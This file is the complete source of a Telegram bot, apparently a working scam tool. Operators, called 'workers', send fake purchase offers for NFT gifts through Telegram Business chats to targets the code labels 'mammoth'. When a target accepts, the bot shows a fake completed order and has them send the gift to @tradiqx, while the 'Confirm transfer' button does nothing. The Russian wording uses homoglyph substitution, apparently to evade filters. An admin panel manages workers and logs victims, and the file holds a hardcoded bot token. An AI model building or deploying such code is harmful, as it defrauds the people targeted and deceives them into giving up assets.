import asyncio
import re
import time
import random
import string
import logging
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LinkPreviewOptions,
)
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "9252419350:AAF9xb1zL6DSzFpHFOi61xvK1vXOZf-dtPk"
MASTER_ADMIN_ID = 8879133564

OFFER_TTL_SECONDS = 6 * 3600
TIMER_INTERVAL = 300  # обновление таймера каждые 5 минут

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

offers: dict = {}

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
RECIPIENT = "@tradiqx"
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}

E_GEM   = "5318901904686754959"
E_WARN  = "6030563507299160824"
E_OK    = "5774022692642492953"
E_NO    = "5774077015388852135"
E_TIMER = "6037268453759389862"
E_GIFT  = "5773677501825945508"
E_STAR  = "6028338546736107668"
E_CHECK = "5774022692642492953"
E_LOCK  = "5774077015388852135"


def em(eid: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'


LAT_TO_CYR = {"A": "А", "a": "а", "C": "С", "c": "с", "E": "Е", "e": "е", "O": "О", "o": "о", "X": "Х", "x": "х"}
CYR_TO_LAT = {v: k for k, v in LAT_TO_CYR.items()}


def homoglyphs(text: str, lang: str) -> str:
    if lang == "ru":
        table = CYR_TO_LAT
    elif lang == "eng":
        table = LAT_TO_CYR
    else:
        return text
    return "".join(table.get(c, c) for c in text)


TEXTS = {
    "ru": {
        "offer_1": "Пoльзοватeль пρeдлагaет вам",
        "offer_for": "зa кoллeкционный пpедмeт",
        "offer_time": "Пpeдложeние дeйствyет eще {hours} ч. {mins} мин.",
        "offer_fix": "Сдeлкa фикcиpуeтcя кнoпкoй «Пpинять».",
        "accept_ok": "{gift} Успешно продан!",
        "accept_give": "• Пepeдaйтe пoкyпaтeлю для зaчиcлeния Ѕtarѕ.",
        "accept_then": "Зaтeм нaжмитe «Пoдтвeрдить пeрeдaчy».",
        "accept_warn": "Кнoпкa cрaбoтaeт тoлькo ecли пoдaрoк yжe y пoлyчaтeля.",
        "accept_price": "зa пoдapoк",
        "order": "Зaкaз",
        "recipient": "пoлyчaтeль",
        "btn_decline": "Oтклoнить",
        "btn_accept": "Принять",
        "btn_show": "Пoкaзaть пoдapoк",
        "btn_give": "Пepeдaть пoдapoк",
        "btn_confirm": "Пoдтвeрдить пepeдaчy",
        "declined": "Oффep был oтклoнён.",
        "stars": "Звёзд",
        "gram": "GRAM",
    },
    "ukr": {
        "offer_1": "Користувач пропонує вам",
        "offer_for": "за подарунок",
        "offer_time": "Пропозиція дійсна ще {hours} год. {mins} хв.",
        "offer_fix": "Угода фіксується кнопкою «Прийняти».",
        "accept_ok": "Пропозицію прийнято",
        "accept_give": "Передайте подарунок",
        "accept_then": "Потім натисніть «Підтвердити передачу».",
        "accept_warn": "Кнопка спрацює лише якщо подарунок вже в отримувача.",
        "accept_price": "за подарунок",
        "order": "Замовлення",
        "recipient": "отримувач",
        "btn_decline": "Відхилити",
        "btn_accept": "Прийняти",
        "btn_show": "Показати подарунок",
        "btn_give": "Передати подарунок",
        "btn_confirm": "Підтвердити передачу",
        "declined": "Пропозицію відхилено.",
        "stars": "Зірок",
        "gram": "GRAM",
    },
    "eng": {
        "offer_1": "A user offers you",
        "offer_for": "for the gift",
        "offer_time": "The offer is valid for another {hours} h. {mins} min.",
        "offer_fix": "The deal is fixed with the «Accept» button.",
        "accept_ok": "Offer accepted",
        "accept_give": "Send the gift",
        "accept_then": "Then press «Confirm transfer».",
        "accept_warn": "The button works only if the gift is already with the recipient.",
        "accept_price": "for the gift",
        "order": "Order",
        "recipient": "recipient",
        "btn_decline": "Decline",
        "btn_accept": "Accept",
        "btn_show": "Show gift",
        "btn_give": "Send gift",
        "btn_confirm": "Confirm transfer",
        "declined": "The offer was declined.",
        "stars": "Stars",
        "gram": "GRAM",
    },
    "cn": {
        "offer_1": "用户向您提出报价",
        "offer_for": "购买礼物",
        "offer_time": "报价还有效 {hours} 小时 {mins} 分钟。",
        "offer_fix": "交易由「接受」按钮确认。",
        "accept_ok": "报价已接受",
        "accept_give": "请发送礼物",
        "accept_then": "然后点击「确认转账」。",
        "accept_warn": "仅当礼物已在接收者处时按钮才会生效。",
        "accept_price": "购买礼物",
        "order": "订单",
        "recipient": "接收者",
        "btn_decline": "拒绝",
        "btn_accept": "接受",
        "btn_show": "显示礼物",
        "btn_give": "发送礼物",
        "btn_confirm": "确认转账",
        "declined": "报价已被拒绝。",
        "stars": "星",
        "gram": "GRAM",
    },
}


def T(lang, key, **kwargs):
    text = TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"].get(key, key))
    if kwargs:
        text = text.format(**kwargs)
    return homoglyphs(text, lang)


# ---------- БД ----------
conn = sqlite3.connect("offers.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_worker INTEGER DEFAULT 0,
        created_at TEXT
    )
""")
cursor.execute("""
    CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )
""")
conn.commit()


def get_setting(key, default=None):
    cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    return row[0] if row else default


def set_setting(key, value):
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()


def del_setting(key):
    cursor.execute("DELETE FROM settings WHERE key = ?", (key,))
    conn.commit()


def add_user(user_id, username=""):
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?, ?, ?)",
        (user_id, username, datetime.now().isoformat())
    )
    conn.commit()
    if username:
        cursor.execute(
            "UPDATE users SET username = ? WHERE user_id = ? AND (username IS NULL OR username = '')",
            (username, user_id)
        )
        conn.commit()


def set_worker(user_id, value=1, username=""):
    add_user(user_id, username)
    cursor.execute("UPDATE users SET is_worker = ? WHERE user_id = ?", (value, user_id))
    conn.commit()


def is_worker(user_id):
    cursor.execute("SELECT is_worker FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    return bool(row and row[0] == 1)


# ---------- ЛОГИ ----------
async def send_log(text: str):
    chat_id = get_setting("log_chat_id")
    if not chat_id:
        return
    topic_id = get_setting("log_topic_id")
    try:
        kwargs = dict(
            chat_id=int(chat_id),
            text=text,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        if topic_id:
            kwargs["message_thread_id"] = int(topic_id)
        await bot.send_message(**kwargs)
    except Exception as e:
        logging.error(f"log error: {e}")


# ---------- ПАРСИНГ ----------
def parse_command(text):
    if not text:
        return None
    parts = text.strip().split()
    if not parts:
        return None
    if parts[0].startswith("/"):
        parts = parts[1:]
    if parts and parts[0].startswith("@"):
        parts = parts[1:]
    if not parts:
        return None

    link = None
    amount = None
    currency = "STARS"
    lang = "ru"

    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me")):
            link = p
            continue
        if low in LANG_TAGS:
            if low == "ru":
                lang = "ru"
            elif low in ("ukr", "uk"):
                lang = "ukr"
            elif low in ("eng", "en"):
                lang = "eng"
            elif low in ("cn", "zh"):
                lang = "cn"
            continue
        if low == "gram":
            currency = "GRAM"
            continue
        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
            currency = "STARS"
            continue
        if amount is None:
            try:
                amount = float(p.replace(",", "."))
            except ValueError:
                pass

    if not link or amount is None:
        return None
    return link, amount, currency, lang


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug = m.group(1)
    num = m.group(2)
    name = re.sub(r'(?<=[a-z])(?=[A-Z])|(?<=[A-Z])(?=[A-Z][a-z])', ' ', slug)
    return name, num


def format_time_left(seconds: int, lang: str) -> str:
    if seconds < 0:
        seconds = 0
    h = seconds // 3600
    m = (seconds % 3600) // 60
    return T(lang, "offer_time", hours=h, mins=m)


def amount_line(amount, currency, lang):
    word = T(lang, "gram" if currency == "GRAM" else "stars")
    if currency == "GRAM":
        return f'{em(E_GEM, "💎")} <b>{amount:.0f} {word}</b>'
    return f'{em(E_STAR, "⭐")} <b>{amount:.0f} {word}</b>'


def gift_link_bold(gift_name, gift_num, lang):
    slug = gift_name.replace(" ", "")
    visible = gift_name if lang == "ru" else homoglyphs(gift_name, lang)
    return f'<b><a href="https://t.me/nft/{slug}-{gift_num}">{visible} #{gift_num}</a></b>'


def build_offer_text(amount, currency, gift_name, gift_num, lang, time_left_sec=None):
    if time_left_sec is None:
        time_left_sec = OFFER_TTL_SECONDS
    time_str = format_time_left(time_left_sec, lang)
    # time_str уже содержит полный текст из offer_time
    h = time_left_sec // 3600
    m = (time_left_sec % 3600) // 60
    raw_time = TEXTS.get(lang, TEXTS["ru"]).get("offer_time", TEXTS["ru"]["offer_time"]).format(hours=h, mins=m)
    raw_fix = TEXTS.get(lang, TEXTS["ru"]).get("offer_fix", TEXTS["ru"]["offer_fix"])
    return (
        f'{em(E_GIFT, "🎁")} {T(lang, "offer_1")}\n'
        f'{amount_line(amount, currency, lang)} {T(lang, "offer_for")} '
        f'{gift_link_bold(gift_name, gift_num, lang)}.\n\n'
        f'{em(E_TIMER, "⏱")} {homoglyphs(raw_time, lang)}\n'
        f'{em(E_LOCK, "🔒")} {homoglyphs(raw_fix, lang)}'
    )


def build_accept_text(amount, currency, gift_name, gift_num, order_id, lang):
    return (
        f'{em(E_CHECK, "✅")} <b>{T(lang, "accept_ok")}</b>\n\n'
        f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num, lang)}.\n'
        f'{T(lang, "accept_then")}\n'
        f'{T(lang, "accept_warn")}\n\n'
        f'{amount_line(amount, currency, lang)} {T(lang, "accept_price")} '
        f'{gift_name if lang == "ru" else homoglyphs(gift_name, lang)} #{gift_num}.\n\n'
        f'<i>{T(lang, "order")} #{order_id}, {T(lang, "recipient")} {RECIPIENT}</i>'
    )


def pack_offer(amount, currency, gift_name, gift_num, lang):
    cur = "G" if currency == "GRAM" else "S"
    name = gift_name.replace(" ", "")
    return f"a|{gift_num}|{amount:.0f}|{cur}|{name}|{lang}"


def unpack_offer(data):
    parts = data.split("|", 5)
    if len(parts) != 6:
        return None
    _, gift_num, amount_s, cur, gift_name_compact, lang = parts
    try:
        amount = float(amount_s)
    except ValueError:
        return None
    currency = "GRAM" if cur == "G" else "STARS"
    name = re.sub(r'(?<=[a-z])(?=[A-Z])|(?<=[A-Z])(?=[A-Z][a-z])', ' ', gift_name_compact)
    return amount, currency, name, gift_num, lang


def gen_order_id():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))


def make_offer_keyboard(amount, currency, gift_name, gift_num, lang):
    accept_data = pack_offer(amount, currency, gift_name, gift_num, lang)
    return InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text=T(lang, "btn_decline"), callback_data="decline", icon_custom_emoji_id=E_NO),
            InlineKeyboardButton(text=T(lang, "btn_accept"), callback_data=accept_data, icon_custom_emoji_id=E_OK),
        ]]
    )


def make_accept_keyboard(gift_name, gift_num, lang):
    recipient = RECIPIENT.lstrip("@")
    slug = gift_name.replace(" ", "")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=T(lang, "btn_show"), url=f"https://t.me/nft/{slug}-{gift_num}", icon_custom_emoji_id=E_GIFT)],
            [InlineKeyboardButton(text=T(lang, "btn_give"), url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id=E_GIFT)],
            [InlineKeyboardButton(text=T(lang, "btn_confirm"), callback_data="noop", icon_custom_emoji_id=E_CHECK)],
        ]
    )


def _gift_preview_url(gift_name: str, gift_num: str) -> str:
    slug = gift_name.replace(" ", "")
    return f"https://t.me/nft/{slug}-{gift_num}"


def _business_offer_from_owner(message: Message) -> bool:
    if message.chat.type != "private" or not message.from_user:
        return False
    return message.from_user.id != message.chat.id


# ---------- ТАЙМЕР ----------
async def timer_loop(offer_id: str):
    try:
        await asyncio.sleep(TIMER_INTERVAL)
        while True:
            offer = offers.get(offer_id)
            if not offer or offer.get("finished"):
                return

            now = time.time()
            time_left = int(offer["expires_at"] - now)

            if time_left <= 0:
                try:
                    await bot.delete_business_messages(
                        business_connection_id=offer["bcid"],
                        message_ids=[offer["msg_id"]],
                    )
                except AttributeError:
                    pass
                except Exception as e:
                    logging.error(f"timer delete error: {e}")
                offers.pop(offer_id, None)
                return

            lang = offer["lang"]
            new_text = build_offer_text(
                offer["amount"], offer["currency"],
                offer["gift_name"], offer["gift_num"],
                lang, time_left
            )
            kb = make_offer_keyboard(offer["amount"], offer["currency"], offer["gift_name"], offer["gift_num"], lang)

            try:
                await bot.edit_message_text(
                    chat_id=offer["chat_id"],
                    message_id=offer["msg_id"],
                    business_connection_id=offer["bcid"],
                    text=new_text,
                    reply_markup=kb,
                    link_preview_options=LinkPreviewOptions(is_disabled=True),
                )
            except Exception as e:
                err = str(e)
                if "Flood control exceeded" in err or "Retry in" in err:
                    m = re.search(r'Retry in (\d+) seconds', err)
                    wait = int(m.group(1)) + 10 if m else 300
                    await asyncio.sleep(wait)
                    continue
                elif "PEER_FLOOD" in err or "message is not modified" in err.lower():
                    pass
                else:
                    logging.error(f"timer edit error: {e}")

            await asyncio.sleep(TIMER_INTERVAL)
    except asyncio.CancelledError:
        return


# ---------- FSM ----------
class AdminStates(StatesGroup):
    waiting_worker_id = State()
    waiting_log_chat = State()
    waiting_log_topic = State()


# ---------- ХЭНДЛЕРЫ ----------
@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    if not _business_offer_from_owner(message):
        return

    sender_id = message.from_user.id
    add_user(sender_id, message.from_user.username or "")

    parsed = parse_command(message.text or "")
    if not parsed:
        return
    link, amount, currency, lang = parsed

    gift = parse_gift(link)
    if not gift:
        return
    gift_name, gift_num = gift

    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except AttributeError:
        pass
    except Exception as e:
        logging.warning(f"delete error: {e}")

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_text(amount, currency, gift_name, gift_num, lang),
            reply_markup=make_offer_keyboard(amount, currency, gift_name, gift_num, lang),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    offer_id = pack_offer(amount, currency, gift_name, gift_num, lang)
    now = time.time()
    offers[offer_id] = {
        "bcid": bcid,
        "chat_id": message.chat.id,
        "msg_id": sent.message_id,
        "amount": amount,
        "currency": currency,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "lang": lang,
        "worker_id": sender_id,
        "worker_username": message.from_user.username or "",
        "mammoth_id": message.chat.id,
        "created_at": now,
        "expires_at": now + OFFER_TTL_SECONDS,
        "finished": False,
        "timer_task": None,
    }
    task = asyncio.create_task(timer_loop(offer_id))
    offers[offer_id]["timer_task"] = task

    worker_name = f"@{message.from_user.username}" if message.from_user.username else f"ID {sender_id}"
    mammoth_name = f"@{message.chat.username}" if message.chat.username else f"ID {message.chat.id}"
    asyncio.create_task(send_log(
        f"📤 <b>Новый оффер</b>\n\nВоркер: {worker_name}\nМамонт: {mammoth_name}\n"
        f"Гифт: <a href='https://t.me/nft/{gift_name.replace(' ', '')}-{gift_num}'>{gift_name} #{gift_num}</a>\n"
        f"Сумма: {amount:.0f} {currency}"
    ))


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "🎁 Пришли ссылку на подарок, язык и сумму:\n"
        "<code>https://t.me/nft/BerryBox-40761 ru 15000 STARS</code>\n"
        "<code>https://t.me/nft/BerryBox-40761 eng 15 GRAM</code>\n\n"
        "Языки: ru, ukr, eng, cn"
    )


@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("⛔ Нет доступа.")
        return
    await show_admin_panel(message)


async def show_admin_panel(target):
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    workers_count = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    log_chat = get_setting("log_chat_id") or "не задан"
    log_topic = get_setting("log_topic_id") or "не задан"

    text = (
        "🛡 <b>Админ-панель</b>\n\n"
        f"👥 Всего пользователей: <b>{total_users}</b>\n"
        f"🟢 Воркеров: <b>{workers_count}</b>\n"
        f"📦 Активных офферов: <b>{len(offers)}</b>\n"
        f"📝 Лог-чат: <code>{log_chat}</code>\n"
        f"🧵 Топик: <code>{log_topic}</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Список воркеров", callback_data="adm_list")],
        [InlineKeyboardButton(text="➕ Выдать права", callback_data="adm_grant")],
        [InlineKeyboardButton(text="➖ Снять права", callback_data="adm_revoke")],
        [InlineKeyboardButton(text="📝 Настроить логи", callback_data="adm_logs")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="adm_refresh")],
    ])
    msg = target if isinstance(target, Message) else target.message
    await msg.answer(text, reply_markup=kb)


@dp.callback_query(F.data == "adm_refresh")
async def adm_refresh(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True)
        return
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    workers_count = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    log_chat = get_setting("log_chat_id") or "не задан"
    log_topic = get_setting("log_topic_id") or "не задан"
    text = (
        "🛡 <b>Админ-панель</b>\n\n"
        f"👥 Всего пользователей: <b>{total_users}</b>\n"
        f"🟢 Воркеров: <b>{workers_count}</b>\n"
        f"📦 Активных офферов: <b>{len(offers)}</b>\n"
        f"📝 Лог-чат: <code>{log_chat}</code>\n"
        f"🧵 Топик: <code>{log_topic}</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Список воркеров", callback_data="adm_list")],
        [InlineKeyboardButton(text="➕ Выдать права", callback_data="adm_grant")],
        [InlineKeyboardButton(text="➖ Снять права", callback_data="adm_revoke")],
        [InlineKeyboardButton(text="📝 Настроить логи", callback_data="adm_logs")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="adm_refresh")],
    ])
    await cb.message.edit_text(text, reply_markup=kb)
    await cb.answer()


@dp.callback_query(F.data == "adm_list")
async def adm_list(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True)
        return
    cursor.execute("SELECT user_id, username FROM users WHERE is_worker = 1")
    rows = cursor.fetchall()
    if not rows:
        await cb.answer("Воркеров нет.", show_alert=True)
        return
    lines = []
    for uid, uname in rows:
        name = f"@{uname}" if uname else f"ID {uid}"
        lines.append(f"• {name} (<code>{uid}</code>)")
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="adm_back")]])
    await cb.message.edit_text("👥 <b>Воркеры:</b>\n\n" + "\n".join(lines), reply_markup=kb)
    await cb.answer()


@dp.callback_query(F.data == "adm_grant")
async def adm_grant(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True)
        return
    await state.set_state(AdminStates.waiting_worker_id)
    await state.update_data(action="grant")
    await cb.message.answer("Введи Telegram ID пользователя которому выдать права воркера:")
    await cb.answer()


@dp.callback_query(F.data == "adm_revoke")
async def adm_revoke(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True)
        return
    await state.set_state(AdminStates.waiting_worker_id)
    await state.update_data(action="revoke")
    await cb.message.answer("Введи Telegram ID пользователя у которого снять права воркера:")
    await cb.answer()


@dp.message(AdminStates.waiting_worker_id)
async def process_worker_id(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    data = await state.get_data()
    action = data.get("action", "grant")
    try:
        target_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Неверный ID. Введи число.")
        return
    await state.clear()
    if action == "grant":
        set_worker(target_id, 1)
        await message.answer(f"✅ Пользователю <code>{target_id}</code> выданы права воркера.")
    else:
        set_worker(target_id, 0)
        await message.answer(f"✅ У пользователя <code>{target_id}</code> сняты права воркера.")


@dp.callback_query(F.data == "adm_logs")
async def adm_logs(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True)
        return
    await state.set_state(AdminStates.waiting_log_chat)
    await cb.message.answer(
        "Введи ID чата для логов.\n"
        "Для группы/канала это число со знаком минус, например: <code>-1001234567890</code>\n"
        "Чтобы узнать ID — перешли сообщение из нужного чата боту @userinfobot"
    )
    await cb.answer()


@dp.message(AdminStates.waiting_log_chat)
async def process_log_chat(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    try:
        chat_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Неверный ID. Введи число.")
        return
    set_setting("log_chat_id", chat_id)
    await state.set_state(AdminStates.waiting_log_topic)
    await message.answer(
        f"✅ Лог-чат установлен: <code>{chat_id}</code>\n\n"
        "Введи ID топика (темы) если нужен, или отправь <code>0</code> чтобы пропустить:"
    )


@dp.message(AdminStates.waiting_log_topic)
async def process_log_topic(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    await state.clear()
    try:
        topic_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Неверный ID.")
        return
    if topic_id == 0:
        del_setting("log_topic_id")
        await message.answer("✅ Топик не задан. Логи будут идти в общий чат.")
    else:
        set_setting("log_topic_id", topic_id)
        await message.answer(f"✅ Топик установлен: <code>{topic_id}</code>")


@dp.callback_query(F.data == "adm_back")
async def adm_back(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True)
        return
    await show_admin_panel(cb)
    await cb.answer()


@dp.callback_query(F.data.startswith("a|"))
async def accept(cb: CallbackQuery):
    data = unpack_offer(cb.data)
    if not data:
        await cb.answer("Ошибка данных", show_alert=True)
        return

    amount, currency, gift_name, gift_num, lang = data
    order_id = gen_order_id()
    text = build_accept_text(amount, currency, gift_name, gift_num, order_id, lang)

    offer_id = cb.data
    offer = offers.get(offer_id)
    if offer:
        offer["finished"] = True
        task = offer.get("timer_task")
        if task and not task.done():
            task.cancel()

    try:
        await cb.message.edit_text(
            text=text,
            reply_markup=make_accept_keyboard(gift_name, gift_num, lang),
        )
    except Exception as e:
        logging.error(f"accept edit error: {e}")
        await cb.answer("Не удалось обновить", show_alert=True)
        return

    await cb.answer()

    mammoth_name = f"@{cb.from_user.username}" if cb.from_user.username else f"ID {cb.from_user.id}"
    asyncio.create_task(send_log(
        f"✅ <b>Оффер принят</b>\n\nМамонт: {mammoth_name}\n"
        f"Гифт: {gift_name} #{gift_num}\nСумма: {amount:.0f} {currency}\nЗаказ: #{order_id}"
    ))


@dp.callback_query(F.data == "decline")
async def decline(cb: CallbackQuery):
    lang = "ru"
    try:
        await cb.message.edit_text(
            text=f'{em(E_NO, "❌")} {T(lang, "declined")}',
            reply_markup=None,
        )
    except Exception as e:
        logging.error(f"decline edit error: {e}")
        await cb.answer("Не удалось обновить", show_alert=True)
        return
    await cb.answer()

    mammoth_name = f"@{cb.from_user.username}" if cb.from_user.username else f"ID {cb.from_user.id}"
    asyncio.create_task(send_log(f"❌ <b>Оффер отклонён</b>\n\nМамонт: {mammoth_name}"))


@dp.callback_query(F.data == "noop")
async def noop(cb: CallbackQuery):
    await cb.answer()


async def main():
    print("Bot started")
    await dp.start_polling(
        bot,
        allowed_updates=[
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "message",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
